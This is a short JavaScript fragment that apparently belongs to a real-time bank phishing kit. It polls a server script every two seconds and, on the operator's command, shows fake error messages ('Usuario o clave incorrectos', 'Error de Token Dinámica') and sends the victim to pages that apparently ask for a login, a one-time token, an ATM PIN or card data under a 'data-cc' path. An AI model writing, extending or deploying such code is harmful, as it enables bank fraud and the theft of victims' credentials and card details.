    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_dinamica.php', {
      method: 'POST',
      body: formData
    });
    const result = await res.json();

    if (result.action) {
      switch (result.action) {
        case 'pedir_dinamica':
          const loader = document.getElementById('loader-overlay');
          if (loader) {
            loader.style.display = 'none';
          }
          alert("Error de Token Dinámica.");
          window.location.href = "token.html";
          break;

        case 'confirm_finalizar':
          window.location.href = "../fin.php";
          break;

        case 'error_logo':
          const loader2 = document.getElementById('loader-overlay');
          if (loader2) {
            loader2.style.display = 'none';
          }
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.html";
          break;

        case 'error_cajero':
          const loader3 = document.getElementById('loader-overlay');
          if (loader3) {
            loader3.style.display = 'none';
          }
          window.location.href = "clav.html";
          break;

        case 'tarjeta': // ✅ botón nuevo manejado
          window.location.href = "../../../../../data-cc/alter.php";
          break;
      }
    } else {
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  } catch (err) {
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
